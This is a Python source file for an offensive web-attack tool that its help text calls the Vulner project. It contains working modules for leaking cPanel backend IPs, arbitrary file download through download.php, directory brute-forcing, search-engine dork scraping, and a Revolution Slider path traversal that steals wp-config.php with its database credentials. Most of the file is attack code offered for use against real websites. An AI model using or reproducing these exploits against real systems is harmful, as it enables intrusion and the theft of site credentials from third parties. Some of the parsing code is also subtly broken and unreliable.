#  -*- coding: utf-8 -*-

import requests, random, threading, time
from colorama import Fore
from bs4 import BeautifulSoup
from ScrapeSearchEngine.ScrapeSearchEngine import Yahoo


def print_error(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTRED_EX}ERRO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')
def print_sucess(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTGREEN_EX}INFO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')
def print_info(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTYELLOW_EX}INFO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')
def print_warning(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTYELLOW_EX}WARN {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')

def helper():
    print(f'''{Fore.LIGHTBLACK_EX}
Modules : 
    {Fore.LIGHTGREEN_EX}cloudssp    {Fore.MAGENTA}-   {Fore.WHITE}CPanel vulnerability to get the host backend
    {Fore.LIGHTGREEN_EX}remotedown  {Fore.MAGENTA}-   {Fore.WHITE}Remote download vulnerability in Wordpress and NameCheap websites  
    {Fore.LIGHTGREEN_EX}heartbleed  {Fore.MAGENTA}-   {Fore.WHITE}Allows remote attackers to obtain sensitive information from process memory
    {Fore.LIGHTGREEN_EX}dirscan     {Fore.MAGENTA}-   {Fore.WHITE}Scan dirrectors in a website from a wordlist (defaults to dirs.txt)
    {Fore.LIGHTGREEN_EX}modules     {Fore.MAGENTA}-   {Fore.WHITE}Shows this message
    {Fore.LIGHTGREEN_EX}credits     {Fore.MAGENTA}-   {Fore.WHITE}Shows the creator socials and detials about the Vulner project

''')

def useragent():
    arr = ["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3","Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16","Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1"]
    return arr[random.randint(0,len(arr)-1)]

def cloudssp(target):
    print()
    if 'http' not in target:
        print_error('Please enter a valid website ( https://test.com )')
        return
    print_info(f'Starting module CloudSSP on {target}')

    try:
        ua = useragent()
        req = requests.get(f'{target}//mailman/listinfo/mailman', headers={"user-agent": ua})
    except:
        print_warning('Target seems to be offline')
        return

    if req.status_code == 200:
        try:
            soup = BeautifulSoup(req.text, 'html.parser')
            backend = soup.find_all('a')
            backend = requests.get(f'{backend[0].get("href")}', stream=True)
            backend = backend.raw._connection.sock.getpeername()[0]
            print_sucess(f'Target {Fore.LIGHTGREEN_EX}IS{Fore.WHITE} vulnerable')
            print_sucess(f'Backend IP : {Fore.MAGENTA}{backend}{Fore.WHITE}\n')
        except:
            print_error('Target isn\'t vulnerable\n')

def remotedown(target):
    print()
    if 'http' not in target:
        print_error('Please enter a valid website ( https://test.com )')
        return
    print_info(f'Starting module RemoteDown on {target}')
    print_info('Input file to download default to test is download.php')
    downfile = input(f'{Fore.WHITE}[{Fore.MAGENTA} INPU{Fore.WHITE} ] {Fore.GREEN}~>{Fore.WHITE} ')
    try:
        ua = useragent()
        req = requests.get(f'{target}/download.php?file={downfile}', headers={"user-agent": ua})
    except:
        print_warning('Target seems to be offline')
        return

    if req.status_code == 200:
        f = open('output.txt', 'w').write(req.text)
        print_sucess(f'Target {Fore.LIGHTGREEN_EX}IS{Fore.WHITE} vulnerable')
        print_sucess('Output saved to output.txt\n')

    else:    
        print_error('Target isn\'t vulnerable\n')

def scraper(dork):
    print()
    results = Yahoo(dork, useragent())
    for result in results:
        print_sucess(result)
    print()

def requestdir(url):
    req = requests.get(url=url, timeout=5,  headers={"user-agent": useragent()})
    if req.status_code == 200:
        print_sucess(f'{Fore.GREEN}{req.status_code}{Fore.WHITE}  -  {url}')
    elif req.status_code != 404:
        print_sucess(f'{Fore.YELLOW}{req.status_code}{Fore.WHITE}  -  {url}')

def dirscan(target):
    print()
    dirs = open('dirs.txt', 'r').readlines()
    for content in dirs:
        content = content.rstrip()
        url = target+'/'+content
        t = threading.Thread(target=requestdir, args=(url, ))
        t.start()
        time.sleep(0.1)
        
def configdownload(target):
    print_info(f'Starting module Config Download on {target}')
    req = requests.get(target + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
    if req.status_code == 200:
        files = open('config.php', "w")
        files.write(req.text)
        print_sucess(f'Target {Fore.LIGHTGREEN_EX}IS{Fore.WHITE} Vulnerable')

        try:
            text = req.text
            db_name = text.split("define('DB_NAME', ")[0]
            db_name = db_name.split("');")[1]
            print_info(f'Database Host : {db_name}')
        except:
            print_error('Failed to pharse request data')
            print_sucess('Output saved to output.txt\n')
    else:
        print_error('Target isn\'t vulnerable\n')
